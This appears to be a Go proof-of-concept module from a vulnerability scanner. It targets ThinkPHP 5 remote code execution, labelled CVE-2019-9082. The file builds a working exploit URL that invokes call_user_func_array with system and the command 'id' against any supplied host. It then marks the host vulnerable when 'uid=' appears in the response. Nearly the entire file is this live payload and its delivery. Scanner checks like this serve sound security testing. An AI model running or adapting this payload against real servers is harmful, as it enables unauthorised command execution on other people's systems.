package pocs

import (
	"bytes"
	"context"
	"fmt"
	"heaven/app/APVE/pkg/common/requests"
	poc "heaven/app/APVE/pkg/protocols"
)

type Thinkphp struct {
	vulId  string
	name   string
	desc   string
	finger string
	status bool
	data   string
}

func init() {
	var tp Thinkphp = Thinkphp{}
	tp.vulId = "CVE-2019-9082"
	tp.name = "thinkphp5-5.0.22_RCE"
	tp.desc = "thinkPHP远程代码执行漏洞"
	tp.finger = "thinkphp"
	poc.AddPocObj(&tp)
}

func (tp *Thinkphp) PocExec(vulUrl string) map[string]interface{} {
	result := make(map[string]interface{})
	url := vulUrl + `/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
	res, err := requests.Get(context.Background(), url)
	if err != nil {
		fmt.Println("请求报错：", err)
	}
	response, err := res.Text()
	if err != nil {
	}
	if bytes.Contains([]byte(response), []byte("uid=")) {
		tp.data = response
		tp.status = true
		result["vulId"] = tp.vulId
		result["name"] = tp.name
		result["desc"] = tp.desc
		result["data"] = tp.data
		result["status"] = tp.status
	}
	return result

}
func (tp *Thinkphp) GetPocInfo() map[string]string {
	info := make(map[string]string)
	info["vulId"] = tp.vulId
	info["finger"] = tp.finger
	return info
}
